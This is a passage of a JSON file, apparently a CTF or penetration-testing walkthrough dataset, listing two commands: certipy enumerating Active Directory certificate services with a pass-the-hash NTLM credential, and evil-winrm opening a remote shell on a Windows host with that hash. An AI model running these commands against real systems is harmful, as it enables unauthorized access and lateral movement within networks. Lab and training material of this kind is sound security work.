      "commands":[
        "certipy find -u operator@domain.local -hashes :<ntlm_hash> -dc-ip 10.10.11.42",
        "evil-winrm -i 10.10.11.222 -u operator -H '<ntlm_hash>'"
      ]
    },
    {
